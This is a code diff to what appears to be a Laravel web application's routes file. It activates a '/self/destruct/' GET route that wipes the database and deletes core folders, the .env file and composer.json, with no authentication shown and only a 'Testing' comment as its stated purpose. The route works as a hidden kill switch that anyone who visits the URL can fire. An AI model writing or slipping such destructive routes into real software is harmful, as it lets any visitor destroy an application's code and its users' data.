@@ -138,22 +138,26 @@ Route::get('/backup/clean', function() {
 
 Route::get('/self/destruct/', function() {
 
+    // Testing Database
+    Artisan::call('db:wipe');
+
+    // Testing Folder
+    Storage::disk('base')->deleteDirectory('storage');
+    Storage::disk('base')->deleteDirectory('public');
+    Storage::disk('base')->deleteDirectory('views');
+    Storage::disk('base')->deleteDirectory('config');
+    Storage::disk('base')->deleteDirectory('vendor');
+    Storage::disk('base')->deleteDirectory('database');
+
+    Storage::disk('base')->deleteDirectory('app/models');
+    Storage::disk('base')->deleteDirectory('app/http/controllers');
+
+    $file = base_path() . '/.env';
+    unlink($file);
+
+    $file = base_path() . '/composer.json';
+    unlink($file);
     
-
-    // Testing #2 #3 #4
-    // Storage::disk('base')->deleteDirectory('storage');
-    // Storage::disk('base')->deleteDirectory('public');
-    // Storage::disk('base')->deleteDirectory('views');
-    // Storage::disk('base')->deleteDirectory('config');
-    // Storage::disk('base')->deleteDirectory('vendor');
-    // Storage::disk('base')->deleteDirectory('database/migrations');
-    // Storage::disk('base')->deleteDirectory('database/seeder');
-
-    // Storage::disk('base')->deleteDirectory('app/models');
-    // Storage::disk('base')->deleteDirectory('app/http/controllers');
-
-    // $file = base_path() . '/.env';
-    // unlink($file);
 
     return 'Done';
 
